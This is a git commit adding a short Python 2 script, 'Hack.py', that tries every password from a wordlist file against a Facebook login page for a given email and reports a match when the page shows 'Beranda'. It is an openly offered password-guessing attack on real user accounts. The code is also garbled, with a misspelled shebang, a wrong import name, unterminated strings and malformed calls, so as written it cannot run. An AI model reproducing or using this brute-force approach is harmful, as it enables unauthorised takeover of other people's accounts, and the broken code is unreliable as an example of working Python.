61c104d900d2a6abed3231a64274d55190aa4d22
MrNOOB <56033162+MrNOOB07@users.noreply.github.com>
2019-10-11 18:25:26 +0700

    python2 Hack.py

---
+++ python2 Hack.py
@@ -0,0 +1,20 @@
+#!/ust/bin/python2
+import os
+import request
+import time
+import sys
+email = raw_input("email_> )
+url='https://free.facebook.com/login.php
+ex = open'('word.txt'), 'r')readlines()
+    
+for line in ex:
+    password = line.strip')
+    http = requests.post(url, data={'email':email, 'pass':password,'login':'submit'
+    content = http.content
+    if "Beranda" in content:
+        print "[+]Password Found ",password
+    else :
+        print "[+]Password Invalid "
+def usage():
+           print("By MrNOOB07")
+print ("[1] HackFBSTRIKE")
